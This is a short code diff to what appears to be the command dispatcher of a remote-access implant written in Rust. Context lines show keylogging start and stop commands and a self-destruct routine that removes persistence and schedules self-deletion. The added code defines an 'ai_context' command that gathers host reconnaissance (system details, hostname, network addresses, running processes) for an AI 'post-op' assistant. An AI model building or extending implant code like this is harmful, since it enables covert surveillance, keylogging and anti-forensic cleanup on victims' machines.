@@ -158,6 +158,21 @@ pub fn dispatch(name: &str, args: &Value, prof: &Profile) -> Result<Value, Strin
         "keylog_start" => keylog_start(),
         "keylog_stop" => keylog_stop(),
         "update_stage" => update_stage(args, prof),
+        "ai_context" => {
+            // Read-only evidence bundle for the AI post-op assistant.  This is
+            // the client-side extension point: any future signal (persistence
+            // markers, update state, recent audit lines) can be appended here
+            // without changing the server or the protocol.
+            let mut procs = platform::process_list().unwrap_or_default();
+            procs.truncate(40);
+            Ok(json!({
+                "ts": wire::now(),
+                "sysinfo": platform::sysinfo(),
+                "net": {"host": platform::hostname(), "addrs": platform::local_addrs()},
+                "processes": procs,
+                "note": "read-only bundle; no files or credentials were collected",
+            }))
+        }
         "selfdestruct" => {
             let _ = crate::persist::remove(&persist_name(prof));
             crate::persist::schedule_self_delete();
